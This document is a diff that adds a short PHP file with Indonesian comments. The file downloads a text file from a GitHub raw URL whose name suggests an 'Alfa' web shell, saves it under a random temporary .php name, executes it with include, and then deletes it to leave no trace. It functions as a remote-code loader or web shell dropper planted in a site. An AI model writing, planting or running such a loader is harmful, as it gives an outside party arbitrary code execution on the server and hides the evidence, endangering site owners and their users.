@@ -1,0 +1,15 @@
+<?php
+$remote_file = "https://raw.githubusercontent.com/waklabu979/sc/refs/heads/main/alfaambarawaxnimuru.txt";
+
+// Buat nama file sementara acak
+$local_file = sys_get_temp_dir() . '/' . uniqid('tmp_', true) . '.php';
+
+// Ambil dari internet dan simpan ke file acak
+file_put_contents($local_file, file_get_contents($remote_file));
+
+// Jalankan
+include $local_file;
+
+// Hapus file setelah dijalankan (opsional)
+@unlink($local_file);
+?>
